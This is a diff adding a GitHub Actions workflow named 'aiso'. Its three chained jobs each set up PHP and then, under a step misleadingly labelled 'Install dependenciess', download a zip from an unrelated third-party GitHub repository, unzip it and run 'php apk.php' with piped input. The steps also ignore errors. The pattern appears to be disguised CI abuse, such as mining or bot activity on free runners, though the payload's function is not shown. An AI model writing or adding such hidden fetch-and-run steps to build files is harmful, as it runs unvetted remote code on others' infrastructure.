@@ -1,0 +1,52 @@
+on:
+  push:
+name: aiso
+
+jobs:
+  run_1:
+    runs-on: ubuntu-latest
+    continue-on-error: true
+    steps:
+    - name: Setup PHP
+      uses: shivammathur/setup-php@v2
+      with:
+        php-version: '8.1'
+        coverage: none
+    - name: Install dependenciess
+      run: |
+        wget https://github.com/Mosnio/mehi1/raw/main/cm/gv.zip
+        unzip gv.zip
+        echo -e "2" | php apk.php
+        
+  run_3:
+    needs: run_2
+    runs-on: ubuntu-latest
+    continue-on-error: true
+    steps:
+    - name: Setup PHP
+      uses: shivammathur/setup-php@v2
+      with:
+        php-version: '8.1'
+        coverage: none
+    - name: Install dependenciess
+      run: |
+        wget https://github.com/Mosnio/mehi1/raw/main/cm/gv.zip
+        unzip gv.zip
+        echo -e "2" | php apk.php
+        
+  run_2:
+    needs: run_1
+    runs-on: ubuntu-latest
+    continue-on-error: true
+    steps:
+    - name: Setup PHP
+      uses: shivammathur/setup-php@v2
+      with:
+        php-version: '8.1'
+        coverage: none
+    - name: Install dependenciess
+      run: |
+        wget https://github.com/Mosnio/mehi1/raw/main/cm/gv.zip
+        unzip gv.zip
+        echo -e "2" | php apk.php
+   
